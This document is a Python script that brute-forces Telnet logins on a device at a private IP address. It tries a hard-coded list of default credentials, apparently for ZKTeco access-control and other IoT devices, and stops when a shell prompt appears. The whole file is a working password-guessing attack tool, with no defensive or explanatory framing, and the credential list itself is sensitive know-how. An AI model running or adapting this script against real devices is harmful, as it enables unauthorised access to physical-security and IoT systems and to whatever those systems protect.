#!/usr/bin/env python3
"""Extended brute force - more passwords + verify rejection."""
import socket
import sys
import time

def strip_telnet(data):
    out = bytearray()
    i = 0
    while i < len(data):
        if data[i] == 0xff and i + 2 < len(data):
            i += 3
        else:
            out.append(data[i])
            i += 1
    return bytes(out)

def recv_until(s, timeout=2):
    s.settimeout(timeout)
    out = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
            if len(out) > 4096:
                break
    except socket.timeout:
        pass
    return strip_telnet(out)

def telnet_try(host, port, user, pwd, wait=3):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    try:
        s.connect((host, port))
        recv_until(s, 2)
        s.send(user.encode() + b'\n')
        time.sleep(0.5)
        recv_until(s, 1)
        s.send(pwd.encode() + b'\n')
        time.sleep(wait)
        r = recv_until(s, 3).decode('utf-8', errors='replace')
        return r
    finally:
        try: s.close()
        except: pass

# All possible ZK default passwords from various articles
combos = [
    # Original Chinese hacker defaults
    ('root', 'solokey'),
    ('root', 'iclock99'),
    ('root', 'mstar'),
    ('root', 'mstar123'),
    # Common IoT defaults
    ('root', 'admin'),
    ('root', 'root'),
    ('root', 'password'),
    ('root', '1234'),
    ('root', '12345'),
    ('root', '123456789'),
    # ZKTeco specific
    ('root', 'zkteco'),
    ('root', 'zkt'),
    ('root', 'zkTeco'),
    ('root', 'iClock'),
    ('root', 'iclock'),
    ('root', 'iclocker'),
    ('admin', 'admin'),
    ('admin', 'zkteco'),
    ('admin', '1234'),
    ('administrator', 'admin'),
    ('administrator', 'zkteco'),
    ('administrator', '1234'),
    ('administrator', 'password'),
    # Numeric
    ('root', '0'),
    ('root', '111111'),
    ('root', '666666'),
    ('root', '888888'),
    ('root', '999999'),
    ('root', '000000'),
    ('root', '1111'),
    ('root', '12345'),
]

host = '172.16.0.214'
for u, p in combos:
    r = telnet_try(host, 23, u, p)
    lower = r.lower()
    if 'incorrect' in lower:
        status = 'REJ'
    elif 'login' in lower and ('$' in r or '#' in r or '~' in r):
        status = 'POSSIBLE_LOGIN'
    elif 'password:' in lower:
        status = 'WAITING'  # probably too quick
    elif 'zlm60' in lower and ('$' not in r and '#' not in r):
        status = 'STILL_BANNER'
    else:
        status = '?'
    print(f'{u}:{p:20s} -> {status}')
    if status == 'POSSIBLE_LOGIN':
        print(f'  Response: {r[:200]!r}')
        sys.exit(0)
